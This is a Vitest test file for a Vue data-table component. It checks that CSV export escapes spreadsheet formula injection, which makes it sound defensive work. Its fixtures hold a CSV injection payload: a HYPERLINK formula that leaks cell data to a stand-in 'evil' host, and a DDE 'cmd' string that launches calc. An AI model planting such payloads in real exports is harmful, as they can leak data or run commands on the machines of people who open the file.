import { describe, it, expect, beforeEach, vi } from 'vitest';
import { render, fireEvent } from '@testing-library/vue';
import { setActivePinia, createPinia } from 'pinia';
import PrimeVue from 'primevue/config';
import DataTablePanel from '@/components/DataTablePanel.vue';
import { useGraphStore } from '@/stores/graph';

beforeEach(() => {
  setActivePinia(createPinia());
});

// Graph data table drawer: PrimeVue's own exportCSV(), made formula-safe via
// :exportFunction / :exportHeader (security assessment M4).
describe('DataTablePanel CSV export (M4)', () => {
  it('exports formula-like values and property keys as text while numbers stay numbers', async () => {
    const graphStore = useGraphStore();
    graphStore.nodes = [
      { node_id: 'n1', node_type: 'Person', properties: { '=key': 'x', name: '=HYPERLINK("http://evil/?"&A1,"Click")', balance: -5 } },
      { node_id: 'n2', node_type: 'Person', properties: { '=key': 'y', name: '-2+3+cmd|\' /C calc\'!A0', balance: 10 } },
    ];

    let blob: Blob | undefined;
    vi.spyOn(URL, 'createObjectURL').mockImplementation((b) => { blob = b as Blob; return 'blob:test'; });
    vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(() => {});

    const { container } = render(DataTablePanel, { global: { plugins: [[PrimeVue, { theme: 'none' }]] } });
    await fireEvent.click(container.querySelector('button[title="Export CSV"]')!);

    const csv = (await blob!.text()).replace(/^﻿/, '');
    expect(csv).toContain(`"'=key"`);
    expect(csv).toContain(`"'=HYPERLINK(""http://evil/?""&A1,""Click"")"`);
    expect(csv).toContain(`"'-2+3+cmd|' /C calc'!A0"`);
    expect(csv).toContain('"-5"');
    expect(csv).not.toMatch(/"[=+@]/);
  });
});
